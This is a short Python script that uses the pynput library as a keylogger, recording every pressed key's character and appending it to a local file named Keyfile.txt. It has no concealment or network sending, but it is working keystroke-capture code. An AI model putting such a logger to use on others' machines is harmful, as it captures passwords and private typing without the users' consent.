from pynput import keyboard

def keypressed(key):
    print(str(key))
    with open("Keyfile.txt", 'a') as logkey:
        try:
            char= key.char
            logkey.write(char)
        except:
            print("Error getting char")

# this is to prevent below code from running if imported in another code

if __name__ == "__main__": 
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    input()